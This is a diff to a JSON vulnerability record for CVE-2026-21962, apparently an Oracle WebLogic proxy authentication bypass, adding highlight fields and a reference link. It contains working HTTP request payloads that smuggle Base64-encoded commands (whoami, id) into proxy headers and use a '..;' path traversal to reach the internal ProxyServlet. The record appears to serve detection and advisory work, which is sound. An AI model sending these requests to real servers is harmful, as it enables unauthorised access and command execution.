@@ -37,7 +37,8 @@
         "https://www.cve.org/CVERecord?id=CVE-2026-21962",
         "https://arcticwolf.com/resources/blog/cve-2026-21962/",
         "https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/cve-2026-21962-oracle-weblogic-proxy-auth-bypass",
-        "https://www.imperva.com/blog/imperva-customers-protected-against-cve-2026-21962-in-oracle-http-and-weblogic/"
+        "https://www.imperva.com/blog/imperva-customers-protected-against-cve-2026-21962-in-oracle-http-and-weblogic/",
+        "https://vulnerabletarget.com/VT-2026-21962"
       ]
     },
     "vulnerabilities": [
@@ -62,7 +63,11 @@
           }
         ],
         "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nproxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nx-forwarded-for: 127.0.0.1;Y21kOndob2FtaQ==\nUser-Agent: Mozilla/5.0 (compatible; Exploit/1.0)\nAccept: */*\nConnection: close\n",
-        "response": "HTTP/1.1 200 OK\nServer: WebLogic Server 14.1.1.0.0\n\n<title>Proxy Servlet</title>\n<h1>BEA WebLogic Server Proxy Servlet</h1>\n<p>Mode: <span style=\"color: red\">VULNERABLE (CVE-2026-21962)</span></p>\n"
+        "response": "HTTP/1.1 200 OK\nServer: WebLogic Server 14.1.1.0.0\n\n<title>Proxy Servlet</title>\n<h1>BEA WebLogic Server Proxy Servlet</h1>\n<p>Mode: <span style=\"color: red\">VULNERABLE (CVE-2026-21962)</span></p>\n",
+        "highlight": [
+          "VULNERABLE (CVE-2026-21962)",
+          "127.0.0.1;Y21kOndob2FtaQ=="
+        ]
       },
       {
         "id": 2,
@@ -123,7 +128,11 @@
           }
         ],
         "request": "GET /console/..;/bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nproxy-client-ip: 127.0.0.1;Y21kOndob2FtaQ==\nx-forwarded-for: 127.0.0.1;Y21kOndob2FtaQ==\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
-        "response": "HTTP/1.1 200 OK\n\n<title>Proxy Servlet</title>\n"
+        "response": "HTTP/1.1 200 OK\n\n<title>Proxy Servlet</title>\n",
+        "highlight": [
+          "console/..;/bea_wls_internal",
+          "127.0.0.1;Y21kOndob2FtaQ=="
+        ]
       },
       {
         "id": 5,
@@ -146,7 +155,11 @@
           }
         ],
         "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nwl-proxy-client-ip: 127.0.0.1;Y21kOmlk\nproxy-client-ip: 127.0.0.1;Y21kOmlk\nx-forwarded-for: 127.0.0.1;Y21kOmlk\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
-        "response": "HTTP/1.1 200 OK\n\n<title>Proxy Servlet</title>\n<pre>cmd:id</pre>\n"
+        "response": "HTTP/1.1 200 OK\n\n<title>Proxy Servlet</title>\n<pre>cmd:id</pre>\n",
+        "highlight": [
+          "cmd:id",
+          "127.0.0.1;Y21kOmlk"
+        ]
       },
       {
         "id": 6,
@@ -156,7 +169,10 @@
         "method": "GET",
         "headers": [],
         "request": "GET /bea_wls_internal/ProxyServlet HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0\nAccept: */*\nConnection: close\n",
-        "response": "HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Basic realm=\"WebLogic Server\"\n\n<title>401 Unauthorized</title>\n<h1>401 Unauthorized</h1>\n"
+        "response": "HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Basic realm=\"WebLogic Server\"\n\n<title>401 Unauthorized</title>\n<h1>401 Unauthorized</h1>\n",
+        "highlight": [
+          "401 Unauthorized"
+        ]
       }
     ],
     "technical": "The vulnerability exists in the WebLogic Server Proxy Plug-in's request handling mechanism.\nThe plug-in fails to adequately validate and sanitize incoming HTTP headers used for\nproxy functionality, specifically:\n\n- wl-proxy-client-ip\n- proxy-client-ip\n- x-forwarded-for\n\nAttackers can inject malicious payloads by:\n1. Using semicolon-delimited values instead of comma-delimited (bypassing IP validation)\n2. Appending Base64-encoded commands (Y21kOndob2FtaQ== decodes to \"cmd:whoami\")\n3. Path traversal sequences (..;) to access restricted internal endpoints like /bea_wls_internal/ProxyServlet\n\nThe ProxyServlet is an internal WebLogic component that should not be directly accessible\nfrom external sources. The authentication bypass allows attackers to route requests through\nthis servlet, potentially accessing backend administration interfaces and internal APIs.\n",
